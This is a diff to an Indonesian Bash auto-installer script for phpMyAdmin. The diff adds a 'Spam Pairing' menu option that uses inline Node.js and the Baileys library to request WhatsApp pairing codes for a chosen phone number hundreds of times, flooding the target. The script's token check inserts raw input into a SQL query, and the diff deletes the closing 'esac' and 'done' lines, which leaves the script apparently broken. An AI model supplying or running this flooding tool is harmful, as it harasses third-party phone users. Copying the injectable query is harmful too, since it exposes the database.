@@ -17,45 +17,28 @@ clear
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}  SELAMAT DATANG AUTO INSTALLER BY FAJAR OFFICIAL  ${NC}"
 echo -e "${GREEN}========================================${NC}"
-echo -e "Silahkan masukkan token:"
+echo -e "Silahkan masukan token:"
 read user_token
 
 # Validasi token
 TOKEN_EXISTS=$(mysql -h $DB_HOST -u $DB_USERNAME -p$DB_PASSWORD -D $DB_NAME -sse "SELECT EXISTS(SELECT 1 FROM tokens WHERE token='$user_token')")
 if [ "$TOKEN_EXISTS" != 1 ]; then
-    echo -e "${RED}Kode Salah Kocak Buy di wa.me/+6283157602477 no free update token 10k free update token 20k${NC}"
+    echo -e "${RED}Token salah, instalasi dibatalkan.${NC}"
     exit 1
-else
-    # Running text untuk menyambut pengguna
-    echo -e "${GREEN}Selamat datang SC Auto Installer by Fajar Official${NC}"
-    sleep 1  # Delay sejenak sebelum memulai running text
-
-    # Running Text yang berjalan (scrolling)
-    clear
-    TEXT="Selamat datang SC Auto Installer by Fajar Official"
-    while :; do
-        echo -n -e "${GREEN}$TEXT\r"
-        TEXT="${TEXT:1}${TEXT:0:1}"  # Scroll text
-        sleep 0.3
-    done &
-
-    # Berikan waktu untuk running text sebelum melanjutkan ke menu
-    sleep 3  # Menjalankan selama 3 detik
-    kill $!  # Menghentikan running text setelah 3 detik
-    clear
 fi
 
 # Menu utama
 while true; do
     clear
     echo -e "${YELLOW}========================================${NC}"
-    echo -e "${YELLOW}  AUTO INSTALLER FAJAR OFFICIAL  ${NC}"
+    echo -e "${YELLOW}  AUTO INSTALLER FAJAR OFFC  ${NC}"
     echo -e "${YELLOW}========================================${NC}"
     echo -e "Silahkan pilih:"
     echo -e "1) Instal phpMyAdmin"
     echo -e "2) Create Database"
     echo -e "3) Uninstall phpMyAdmin"
-    echo -e "4) Exit"
+    echo -e "4) Spam Pairing (Baileys)"
+    echo -e "5) Exit"
     read -p "Pilihan Anda: " choice
 
     case $choice in
@@ -178,10 +161,38 @@ EOT
             fi
             ;;
         4)
+            clear
+            echo -e "Masukkan nomor yang ingin dipasangkan dan jumlah percakapan:"
+            read -p "Contoh: +628xxxxxx|150 : " text
+            if [[ -z "$text" ]]; then
+                echo -e "${RED}Contoh format salah! Harap gunakan format yang benar: +628xxxxxx|150${NC}"
+                continue
+            fi
+
+            IFS="|" read -r peenis pepekk <<< "$text"
+            pepekk="${pepekk:-200}"
+
+            # Clean phone number
+            target=$(echo $peenis | sed 's/[^0-9]//g')
+
+            echo -e "${YELLOW}Starting Spam Pairing for number: $target with $pepekk attempts...${NC}"
+
+            # Using Node.js and Baileys API to handle pairing
+            node -e "
+                (async () => {
+                    const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+                    const { state } = await useMultiFileAuthState('pepek');
+                    const { version } = await fetchLatestBaileysVersion();
+                    const pino = require('pino');
+                    const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
+
+                    for (let i = 0; i < $pepekk; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        let prc = await sucked.requestPairingCode('$target');
+                        console.log(\`_Success Spam Pairing Code - Number: $target - Code: \${prc}_\`);
+                    }
+                })();
+            "
+            ;;
+        5)
             exit 0
-            ;;
-        *)
-            echo -e "${RED}Pilihan tidak valid!${NC}"
-            ;;
-    esac
-done
